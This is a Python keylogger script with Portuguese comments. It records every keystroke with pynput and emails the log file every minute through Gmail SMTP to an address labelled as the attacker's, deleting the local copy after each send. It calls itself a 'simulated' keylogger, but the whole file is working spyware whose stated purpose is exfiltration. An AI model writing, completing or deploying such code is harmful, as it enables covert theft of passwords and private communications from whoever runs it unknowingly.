import pynput.keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading
import os
import time

# =======================================================
# 🚨 1. CONFIGURAÇÕES DE EXFILTRAÇÃO (MUDAR ESTES DADOS)
# =======================================================
SENDER_EMAIL = "seu_email_de_teste@gmail.com" # Use uma conta criada apenas para testes
SENDER_PASSWORD = "sua_senha_de_app"       # Use uma senha de app/token (mais seguro que a senha normal)
RECEIVER_EMAIL = "email_do_atacante@exemplo.com"
SMTP_SERVER = "smtp.gmail.com"            # Para Gmail. Use "smtp-mail.outlook.com" para Outlook/Hotmail
SMTP_PORT = 587
REPORT_INTERVAL = 60                       # Tempo em segundos para enviar o log (a cada 1 minuto)
LOG_FILE = "log.txt"

# =======================================================
# 2. LÓGICA DE EXFILTRAÇÃO (NOVA FUNÇÃO)
# =======================================================

def send_log():
    # Verifica se o log existe e tem conteúdo
    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        schedule_report() # Agenda o próximo envio e sai
        return

    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = "LOG CAPTURADO - Keylogger Simulado"

    # Anexa o arquivo de log
    try:
        with open(LOG_FILE, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {LOG_FILE}")
        msg.attach(part)

        # Envia o e-mail
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()

        # Limpa o log local após envio bem-sucedido
        os.remove(LOG_FILE)
        print(f"Log enviado e arquivo {LOG_FILE} limpo.")

    except Exception as e:
        print(f"Erro ao enviar e-mail (Verifique o NAT e as credenciais): {e}")
    
    # Agenda o próximo envio automaticamente
    schedule_report()

def schedule_report():
    # Cria um timer para chamar send_log() após o intervalo
    timer = threading.Timer(REPORT_INTERVAL, send_log)
    timer.daemon = True 
    timer.start()

# =======================================================
# 3. LÓGICA DE CAPTURA (SEU CÓDIGO ORIGINAL MODIFICADO)
# =======================================================

IGNORAR = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l, 
    keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r, 
    keyboard.Key.caps_lock, keyboard.Key.cmd
}

def on_press(key):
    try: 
        # Tenta escrever tecla normal
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Trata teclas especiais
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

# =======================================================
# 4. INICIALIZAÇÃO
# =======================================================

# Inicia o agendamento de relatórios
schedule_report()

# Inicia o ouvinte de teclado
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
